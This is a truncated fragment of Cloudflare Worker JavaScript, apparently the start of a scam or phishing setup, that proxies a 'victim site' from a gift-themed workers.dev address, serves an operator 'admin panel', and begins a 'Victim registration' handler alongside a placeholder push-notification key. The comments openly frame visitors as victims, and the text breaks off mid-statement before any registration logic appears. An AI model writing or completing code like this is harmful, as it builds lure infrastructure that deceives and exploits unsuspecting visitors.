// Cloudflare Worker - Copy paste exactly!
export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const vapidPublicKey = 'YOUR_VAPID_PUBLIC_KEY_HERE'; // Generate below!
    
    // Serve victim site
    if(url.pathname === '/') {
      return fetch('https://lovelygift.rajputvashu429.workers.dev/');
    }
    
    // Serve admin panel
    if(url.pathname === '/admin.html') {
      const adminHtml = await fetch('https://lovelygift.rajputvashu429.workers.dev/admin');
      return adminHtml;
    }
    
    // Victim registration
    if(request.method
